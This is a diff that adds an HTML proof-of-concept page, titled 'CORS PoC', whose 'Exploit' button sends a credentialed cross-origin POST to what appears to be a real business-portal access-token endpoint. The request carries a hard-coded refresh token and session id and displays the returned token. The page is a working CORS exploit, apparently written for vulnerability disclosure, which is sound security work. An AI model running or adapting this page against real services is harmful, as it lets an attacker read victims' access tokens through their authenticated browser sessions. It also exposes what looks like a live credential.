@@ -1,0 +1,28 @@
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+var json ={"refresh_token":"0NJEr2LVDruDqufG3eBXpO98tEEDHLH8CqXkMDzWFvHynKceCT34JiU8Q6BexPI2cdKJEcf7jU1bDZWRBOe5HClKIeumTJIPdPvmOavmLX6C7MvTdgdb2Ut54iFsbtcVYMdbJOgNJ9ToPVbkYG8mMcl3uIDioWVHHT8BYg5bhe1vSoxRVWM0EO7qq7iEQWwaSsw3XrfPWrl1vwL1Vbgfmh1w6TVmkx3uDBhoy6s5piOhhkwEIldScakl9xnwrES"}
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                  document.getElementById("demo").innerHTML = alert(this.responseText);
+                
+                 }
+             };
+		
+              xhr.open("POST",
+                       "https://node.bolt.eu/business-portal/businessPortal/getAccessToken?version=BP.21.59&session_id=779476b174913103", true);
+xhr.setRequestHeader('Content-Type', 'application/json')
+             xhr.withCredentials = true;
+xhr.send(JSON.stringify(json))
+        
+             }
+         </script>
+     xhr.send();
+     </body>
+ </html>
